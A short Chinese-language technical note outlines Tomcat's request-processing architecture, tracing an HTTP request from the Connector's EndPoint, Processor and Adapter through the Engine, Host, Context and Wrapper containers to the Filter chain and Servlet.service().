Tomcat运行机制

细节可以看一下这个师傅的文章21张图解析Tomcat运行原理与架构全貌

Tomcat标准工作流：Connector[EndPoint->Processor->Adapter] -> Container [Engine->Host->Context->Wrapper]

当 Tomcat 接收到一个 HTTP 请求时：

  1. Connector 中的 Endpoint 接收 TCP 连接并分配 Socket；
  2. Processor 解析 HTTP 协议，构建 Coyote 层的 Request/Response；
  3. CoyoteAdapter 将其转换为标准的 HttpServletRequest/Response，并调用 Container 的处理链；
  4. Engine 使用内部 Mapper 组件，根据请求的 Host 头匹配到对应的 Host；
  5. Mapper 继续根据 URI 路径（如 /app/user）匹配到具体的 Context（Web 应用）；
  6. Context的映射规则进一步匹配到目标 Wrapper（即 Servlet）；
  7. 容器依次执行配置的 Filter 链，最终调用 Servlet.service() 执行业务逻辑；
  8. 响应经原路返回给客户端。
